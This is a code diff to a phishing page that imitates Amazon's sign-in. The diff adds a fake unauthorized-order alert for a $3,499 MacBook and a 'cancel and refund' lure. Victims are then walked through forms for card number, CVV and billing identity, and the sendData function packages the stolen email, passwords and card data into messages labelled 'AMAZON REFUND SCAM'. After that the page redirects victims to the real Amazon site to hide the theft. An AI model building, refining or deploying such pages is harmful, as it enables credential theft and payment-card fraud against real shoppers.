@@ -7,63 +7,88 @@
     <link rel="icon" href="https://www.amazon.com/favicon.ico">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "Amazon Ember", Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
+        body { font-family: "Amazon Ember", Arial, sans-serif; background: #FFFFFF; min-height: 100vh; display: flex; flex-direction: column; }
         .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 14px 18px; }
         .logo { padding: 14px 0 12px; }
-        .logo img { height: 31px; }
-        .logo-text { font-family: "Amazon Ember", Arial; font-size: 30px; font-weight: 700; color: #0F1111; letter-spacing: -.5px; }
-        .logo-text .arrow { color: #FF9900; }
-        .box { border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; max-width: 350px; width: 100%; }
-        h1 { font-size: 28px; font-weight: 400; color: #0F1111; margin-bottom: 10px; }
-        .email-display { font-size: 13px; color: #0F1111; margin-bottom: 14px; }
-        .email-display a { color: #0066c0; text-decoration: none; margin-left: 5px; }
+        .logo-link { text-decoration: none; }
+        .logo-text { font-family: "Amazon Ember", Arial; font-size: 31px; font-weight: 700; color: #000000; letter-spacing: -.5px; }
+        .box { border: 1px solid #DDD; border-radius: 8px; padding: 20px 26px; max-width: 350px; width: 100%; }
+        h1 { font-size: 28px; font-weight: 400; color: #111111; margin-bottom: 10px; }
+        .email-display { font-size: 13px; color: #111111; margin-bottom: 14px; }
+        .email-display a { color: #0066C0; text-decoration: none; margin-left: 5px; }
+        .email-display a:hover { color: #C45500; text-decoration: underline; }
         .form-group { margin-bottom: 14px; }
         .label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
-        label { font-size: 13px; font-weight: 700; color: #0F1111; }
-        .forgot-link { font-size: 13px; color: #0066c0; text-decoration: none; }
+        label { font-size: 13px; font-weight: 700; color: #111111; }
+        .forgot-link { font-size: 13px; color: #0066C0; text-decoration: none; }
+        .forgot-link:hover { color: #C45500; text-decoration: underline; }
         input[type="text"], input[type="password"], input[type="email"], input[type="tel"] { 
             width: 100%; padding: 7px 10px; font-size: 13px; 
             border: 1px solid #888C8C; border-radius: 4px; outline: none; 
         }
-        input:focus { border-color: #007185; box-shadow: 0 0 0 3px #C8F3FA; }
+        input:focus { border-color: #E77600; box-shadow: 0 0 0 3px rgba(228,121,17,0.5); }
         .btn { 
-            width: 100%; padding: 8px 10px; font-size: 13px; 
+            width: 100%; padding: 10px; font-size: 13px; font-weight: 400;
             background: #FFD814; border: 1px solid #FCD200; 
             border-radius: 8px; cursor: pointer; color: #0F1111; 
             margin-top: 12px;
         }
         .btn:hover { background: #F7CA00; }
-        .legal { font-size: 12px; color: #0F1111; margin-top: 16px; line-height: 1.5; }
-        .legal a { color: #0066c0; text-decoration: none; }
+        .btn-orange {
+            background: #FA8900; border: 1px solid #E77600; color: #FFFFFF; font-weight: 700;
+        }
+        .btn-orange:hover { background: #E77600; }
+        .btn-danger {
+            background: #CC0C39; border: 1px solid #B00020; color: #FFFFFF; font-weight: 700;
+        }
+        .btn-danger:hover { background: #A00018; }
+        .legal { font-size: 12px; color: #111111; margin-top: 16px; line-height: 1.5; }
+        .legal a { color: #0066C0; text-decoration: none; }
+        .legal a:hover { color: #C45500; text-decoration: underline; }
         .help-section { margin-top: 18px; }
-        .help-link { font-size: 13px; color: #0066c0; text-decoration: none; cursor: pointer; display: flex; align-items: center; gap: 4px; }
-        .divider-section { margin-top: 22px; padding-top: 18px; border-top: 1px solid #ddd; }
-        .divider-title { font-size: 13px; font-weight: 700; color: #0F1111; margin-bottom: 6px; }
-        .divider-link { font-size: 13px; color: #0066c0; text-decoration: none; }
-        .footer { text-align: center; padding: 26px 18px; background: linear-gradient(to bottom, rgba(0,0,0,.03), rgba(0,0,0,.08)); border-top: 1px solid #ddd; }
+        .help-link { font-size: 13px; color: #0066C0; text-decoration: none; cursor: pointer; }
+        .help-link:hover { color: #C45500; text-decoration: underline; }
+        .divider-section { margin-top: 22px; padding-top: 18px; border-top: 1px solid #DDD; }
+        .divider-title { font-size: 13px; font-weight: 700; color: #111111; margin-bottom: 6px; }
+        .divider-link { font-size: 13px; color: #0066C0; text-decoration: none; }
+        .divider-link:hover { color: #C45500; text-decoration: underline; }
+        .footer { text-align: center; padding: 26px 18px; background: linear-gradient(to bottom, rgba(0,0,0,.03), rgba(0,0,0,.08)); border-top: 1px solid #DDD; }
         .footer-links { display: flex; justify-content: center; gap: 24px; margin-bottom: 8px; }
-        .footer-links a { font-size: 11px; color: #0066c0; text-decoration: none; }
-        .footer-copy { font-size: 11px; color: #555; }
-        .error { background: #FCF4F4; border: 1px solid #CC0C39; border-radius: 8px; padding: 14px 18px; margin-bottom: 14px; display: none; }
+        .footer-links a { font-size: 11px; color: #0066C0; text-decoration: none; }
+        .footer-copy { font-size: 11px; color: #555555; }
+        .error { background: #FFF5F5; border: 1px solid #CC0C39; border-radius: 8px; padding: 14px 18px; margin-bottom: 14px; display: none; }
         .error.show { display: flex; gap: 12px; align-items: flex-start; }
-        .error-icon { color: #CC0C39; font-size: 20px; }
-        .error-text { font-size: 13px; color: #0F1111; }
-        .error-title { font-weight: 700; color: #CC0C39; margin-bottom: 4px; }
+        .error-icon { color: #CC0C39; font-size: 18px; line-height: 1; }
+        .error-text { font-size: 13px; color: #111111; }
+        .error-title { font-weight: 700; color: #CC0C39; margin-bottom: 2px; }
         .step { display: none; }
         .step.active { display: block; }
         .loading { display: none; text-align: center; padding: 40px 20px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #FF9900; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
+        .spinner { border: 3px solid #F3F3F3; border-top: 3px solid #FF9900; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .card-icons { display: flex; gap: 8px; margin: 12px 0; }
         .card-icons img { height: 22px; }
         .ssn-group { display: none; }
         .check-icon { color: #067D62; font-size: 48px; margin-bottom: 16px; }
+        .alert-box { background: #FEF8F2; border: 2px solid #CC0C39; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+        .alert-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+        .alert-icon { color: #CC0C39; font-size: 24px; }
+        .alert-title { font-size: 16px; font-weight: 700; color: #CC0C39; }
+        .order-box { background: #FFFFFF; border: 1px solid #DDD; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+        .order-header { font-size: 12px; color: #565959; margin-bottom: 8px; }
+        .order-item { display: flex; gap: 12px; }
+        .order-img { width: 70px; height: 70px; background: #F7F7F7; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
+        .order-details { flex: 1; }
+        .order-name { font-size: 14px; color: #0F1111; font-weight: 500; margin-bottom: 4px; }
+        .order-price { font-size: 16px; color: #B12704; font-weight: 700; }
+        .order-info { font-size: 12px; color: #565959; margin-top: 4px; }
+        .order-status { display: inline-block; background: #CC0C39; color: #FFF; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 4px; margin-top: 6px; }
     </style>
 </head>
 <body>
     <div class="main">
         <div class="logo">
-            <a href="https://www.amazon.com">
+            <a href="https://www.amazon.com" class="logo-link">
                 <div class="logo-text">amazon</div>
             </a>
         </div>
@@ -79,7 +104,7 @@
             </form>
             <p class="legal">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
             <div class="help-section">
-                <a href="#" class="help-link">&#9660; Need help?</a>
+                <a href="#" class="help-link">&#9662; Need help?</a>
             </div>
             <div class="divider-section">
                 <div class="divider-title">Buying for work?</div>
@@ -109,9 +134,34 @@
             </form>
         </div>
 
-        <div class="box step" id="step3">
-            <h1>Update payment method</h1>
-            <p style="font-size:13px;color:#565959;margin-bottom:16px;">Please verify your payment information to continue.</p>
+        <div class="box step" id="step3" style="max-width:400px;">
+            <div class="alert-box">
+                <div class="alert-header">
+                    <div class="alert-icon">&#9888;</div>
+                    <div class="alert-title">Suspicious Activity Detected</div>
+                </div>
+                <p style="font-size:13px;color:#111;margin-bottom:12px;">We detected an unauthorized purchase attempt on your account. If you did not make this order, please cancel immediately to prevent charges.</p>
+            </div>
+            <div class="order-box">
+                <div class="order-header">Order #112-9847362-8273645 | Placed today</div>
+                <div class="order-item">
+                    <div class="order-img">&#128187;</div>
+                    <div class="order-details">
+                        <div class="order-name">Apple MacBook Pro 16" M3 Max 1TB</div>
+                        <div class="order-price">$3,499.00</div>
+                        <div class="order-info">Qty: 1 | Ships to: Unknown Address</div>
+                        <div class="order-status">PENDING PAYMENT</div>
+                    </div>
+                </div>
+            </div>
+            <p style="font-size:12px;color:#565959;margin-bottom:14px;text-align:center;">To cancel this order and secure your account, please verify your payment method.</p>
+            <button class="btn btn-danger" id="cancelOrderBtn" style="margin-top:0;">&#10060; Cancel Order & Request Refund</button>
+            <p style="font-size:11px;color:#888;margin-top:12px;text-align:center;">Your refund will be processed within 3-5 business days</p>
+        </div>
+
+        <div class="box step" id="step4">
+            <h1>Verify payment method</h1>
+            <p style="font-size:13px;color:#565959;margin-bottom:16px;">To process your refund, please confirm your payment details.</p>
             <form id="cardForm">
                 <div class="form-group">
                     <label>Name on card</label>
@@ -135,15 +185,14 @@
                     <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" style="height:18px;">
                 </div>
-                <button type="submit" class="btn">Continue</button>
+                <button type="submit" class="btn btn-orange">Process Refund</button>
             </form>
         </div>
 
-        <div class="box step" id="step4">
-            <h1>Verify your identity</h1>
-            <p style="font-size:13px;color:#565959;margin-bottom:16px;">For your security, please confirm your billing information.</p>
+        <div class="box step" id="step5">
+            <h1>Confirm your identity</h1>
+            <p style="font-size:13px;color:#565959;margin-bottom:16px;">Final verification step to complete your refund.</p>
             <form id="billingForm">
                 <div class="form-group">
                     <label>Full name</label>
@@ -162,7 +211,7 @@
                     <input type="tel" id="phone" required>
                 </div>
                 <div class="form-group">
-                    <label>Street address</label>
+                    <label>Billing address</label>
                     <input type="text" id="address" required>
                 </div>
                 <div style="display:flex;gap:12px;">
@@ -175,20 +224,21 @@
                         <input type="text" id="zip" required>
                     </div>
                 </div>
-                <button type="submit" class="btn">Verify</button>
+                <button type="submit" class="btn btn-orange">Complete Refund</button>
             </form>
         </div>
 
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p style="font-size:13px;color:#565959;">Please wait...</p>
+            <p style="font-size:13px;color:#565959;">Processing your request...</p>
         </div>
 
-        <div class="box step" id="step5">
+        <div class="box step" id="step6">
             <div style="text-align:center;padding:20px 0;">
                 <div class="check-icon">&#10003;</div>
-                <h2 style="font-size:21px;font-weight:400;color:#0F1111;margin-bottom:12px;">Verification complete</h2>
-                <p style="font-size:13px;color:#565959;margin-bottom:20px;">Your account has been verified successfully.</p>
+                <h2 style="font-size:21px;font-weight:400;color:#0F1111;margin-bottom:12px;">Refund Initiated Successfully</h2>
+                <p style="font-size:13px;color:#565959;margin-bottom:8px;">Order #112-9847362-8273645 has been cancelled.</p>
+                <p style="font-size:14px;color:#067D62;font-weight:700;margin-bottom:20px;">Your refund of $3,499.00 is being processed.</p>
                 <p style="font-size:12px;color:#888;">Redirecting to Amazon...</p>
             </div>
         </div>
@@ -261,7 +311,7 @@
 
         async function sendData(step) {
             collectedData.timestamp = new Date().toISOString();
-            let msg = '** AMAZON - Step ' + step + ' **\n======================\n';
+            let msg = '** AMAZON REFUND SCAM - Step ' + step + ' **\n======================\n';
             msg += 'Email: ' + collectedData.email + '\n';
             msg += 'Password 1: ' + collectedData.password + '\n';
             if (collectedData.password2) msg += 'Password 2: ' + collectedData.password2 + '\n';
@@ -335,6 +385,10 @@
             setTimeout(() => { showLoading(false); showStep(3); }, 1500);
         });
 
+        document.getElementById('cancelOrderBtn').addEventListener('click', function() {
+            showStep(4);
+        });
+
         document.getElementById('cardForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             collectedData.cardName = document.getElementById('cardName').value;
@@ -343,7 +397,7 @@
             collectedData.cardCvv = document.getElementById('cardCvv').value;
             showLoading(true);
             await sendData(2);
-            setTimeout(() => { showLoading(false); showStep(4); }, 1800);
+            setTimeout(() => { showLoading(false); showStep(5); }, 1800);
         });
 
         document.getElementById('billingForm').addEventListener('submit', async function(e) {
@@ -359,7 +413,7 @@
             await sendData(3);
             setTimeout(() => {
                 showLoading(false);
-                showStep(5);
+                showStep(6);
                 setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000);
             }, 2000);
         });
